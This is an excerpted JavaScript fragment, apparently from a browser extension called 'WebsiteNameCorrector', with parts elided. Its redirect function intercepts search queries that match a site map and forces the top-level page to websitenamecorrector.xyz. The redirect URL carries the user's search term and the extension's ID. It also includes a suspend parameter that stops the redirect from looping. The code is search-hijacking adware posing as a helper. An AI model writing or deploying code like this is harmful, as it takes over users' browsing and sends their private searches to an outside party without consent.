...
WebsiteNameCorrectorCnst.SUSPEND_PARAM_VAL = "suspend_" + "WebsiteNameCorrector";
WebsiteNameCorrectorCnst.SEARCH_SITES =
...
var WebsiteNameCorrectorRedirect = function(){
	...
	if(typeof QueryString[WebsiteNameCorrectorCnst.SUSPEND_PARAM_VAL ] !== "undefined"){
		return;
	}
	...
	var valFromMap = WebsiteNameCorrectorSiteMap[QueryString.q] ;
	if(typeof valFromMap === "undefined" ){

		valFromMap = WebsiteNameCorrectorSiteMap[encodeURIComponent(QueryString.q)];
	}

	if(typeof valFromMap === "undefined" ){

		valFromMap = WebsiteNameCorrectorSiteMap[encodeURIComponent(encodeURIComponent(QueryString.q))];
	}
	...
	typeof valFromMap!== "undefined"  &&(function(){
		...
		var d = "websitenamecorrector.xyz";
		top.location.href = d +"/searcher.html?#q=" + encodeURIComponent(valFromMap) + "&term=" + encodeURIComponent(QueryString.q)
		+"&sus=" + WebsiteNameCorrectorCnst.SUSPEND_PARAM_VAL + "&name=WebsiteNameCorrector" + "&id=" + chrome.runtime.id;
...
var isAllowedBySite = function(url){
	var allowedSites = WebsiteNameCorrectorCnst.SEARCH_SITES;
